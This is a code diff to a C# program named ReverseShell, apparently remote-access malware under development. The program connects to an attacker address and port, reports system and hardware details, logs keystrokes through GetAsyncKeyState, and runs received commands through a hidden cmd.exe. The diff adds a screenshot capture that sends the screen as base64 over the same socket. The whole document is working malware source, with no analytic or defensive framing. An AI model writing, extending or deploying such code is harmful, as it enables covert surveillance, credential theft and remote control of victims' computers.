@@ -1,11 +1,14 @@
 using System;
-using System.Net.Sockets;
-using System.IO;
 using System.Diagnostics;
-using System.Text;
+using System.Drawing; 
+using System.Drawing.Imaging; 
+using System.IO;
 using System.Management;
+using System.Net.Sockets;
 using System.Runtime.InteropServices;
+using System.Text;
 using System.Threading;
+using System.Windows.Forms; 
 
 class ReverseShell
 {
@@ -20,11 +23,34 @@ class ReverseShell
         return info;
     }
 
+    static void CaptureScreenshot(StreamWriter writer)
+    {
+        try
+        {
+            Rectangle bounds = Screen.PrimaryScreen.Bounds;
+            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
+            using (Graphics g = Graphics.FromImage(bitmap))
+            {
+                g.CopyFromScreen(0, 0, 0, 0, bounds.Size);
+                using (MemoryStream ms = new MemoryStream())
+                {
+                    bitmap.Save(ms, ImageFormat.Jpeg); 
+                    string base64Image = Convert.ToBase64String(ms.ToArray());
+                    writer.WriteLine($"[SCREENSHOT] {base64Image}");
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            writer.WriteLine($"[ERROR] Screenshot failed: {ex.Message}");
+        }
+    }
+
     static string ConvertKey(int keyCode)
     {
         if (keyCode == 160 || keyCode == 161 || keyCode == 162 || keyCode == 163 || keyCode == 164)
         {
-            return string.Empty; 
+            return string.Empty;
         }
 
         switch (keyCode)
@@ -41,23 +67,22 @@ class ReverseShell
             default:
                 if (keyCode >= 65 && keyCode <= 90)
                 {
-                    return ((char)keyCode).ToString().ToLower(); 
+                    return ((char)keyCode).ToString().ToLower();
                 }
-                else if (keyCode >= 48 && keyCode <= 57) 
+                else if (keyCode >= 48 && keyCode <= 57)
                 {
                     return ((char)keyCode).ToString();
                 }
-                else if (keyCode >= 96 && keyCode <= 105) 
+                else if (keyCode >= 96 && keyCode <= 105)
                 {
                     return ((char)(keyCode - 48)).ToString();
                 }
                 else
                 {
-                    return string.Empty; 
+                    return string.Empty;
                 }
         }
     }
-
 
     static string GetHardwareInfo(string hwclass, string syntax)
     {
@@ -75,10 +100,10 @@ class ReverseShell
 
         while (true)
         {
-            Thread.Sleep(50); 
-            for (int i = 0; i < 255; i++) 
+            Thread.Sleep(50);
+            for (int i = 0; i < 255; i++)
             {
-                if (GetAsyncKeyState(i) == -32767) 
+                if (GetAsyncKeyState(i) == -32767)
                 {
                     string key = ConvertKey(i);
 
@@ -86,17 +111,14 @@ class ReverseShell
                     {
                         logBuffer.Append(key);
 
-                        //Console.WriteLine($"Key Pressed: {key} (Key Code: {i})");
-
                         if (key == "[ENTER]")
                         {
                             if (logBuffer.Length > 0)
                             {
                                 string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {logBuffer.ToString()}";
-                                writer.WriteLine("[KEYLOG] " + logEntry);
+                                //writer.WriteLine("[KEYLOG] " + logEntry);
                                 writer.Flush();
-                                //Console.WriteLine($"Log Sent: {logEntry}"); 
-                                logBuffer.Clear(); 
+                                logBuffer.Clear();
                             }
                         }
                     }
@@ -105,14 +127,14 @@ class ReverseShell
         }
     }
 
-
-    [DllImport("user32.dll")] static extern short GetAsyncKeyState(int vKey);
+    [DllImport("user32.dll")]
+    static extern short GetAsyncKeyState(int vKey);
 
     static void Main()
     {
         string attackerIP = "127.0.0.1";
         int attackerPort = 4444;
-        
+
         try
         {
             using (TcpClient client = new TcpClient(attackerIP, attackerPort))
@@ -122,25 +144,33 @@ class ReverseShell
             {
                 writer.AutoFlush = true;
                 writer.WriteLine(GetSystemInfo());
+
                 Thread keyloggerThread = new Thread(() => Keylogger(writer));
                 keyloggerThread.Start();
-                
+
                 while (true)
                 {
                     string command = reader.ReadLine();
                     if (command.ToLower() == "exit") break;
-                    
-                    Process proc = new Process();
-                    proc.StartInfo.FileName = "cmd.exe";
-                    proc.StartInfo.Arguments = "/c " + command;
-                    proc.StartInfo.RedirectStandardOutput = true;
-                    proc.StartInfo.RedirectStandardError = true;
-                    proc.StartInfo.UseShellExecute = false;
-                    proc.StartInfo.CreateNoWindow = true;
-                    proc.Start();
-                    
-                    string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
-                    writer.WriteLine(output);
+
+                    if (command.ToLower() == "screenshot")
+                    {
+                        CaptureScreenshot(writer);
+                    }
+                    else
+                    {
+                        Process proc = new Process();
+                        proc.StartInfo.FileName = "cmd.exe";
+                        proc.StartInfo.Arguments = "/c " + command;
+                        proc.StartInfo.RedirectStandardOutput = true;
+                        proc.StartInfo.RedirectStandardError = true;
+                        proc.StartInfo.UseShellExecute = false;
+                        proc.StartInfo.CreateNoWindow = true;
+                        proc.Start();
+
+                        string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
+                        writer.WriteLine(output);
+                    }
                 }
             }
         }
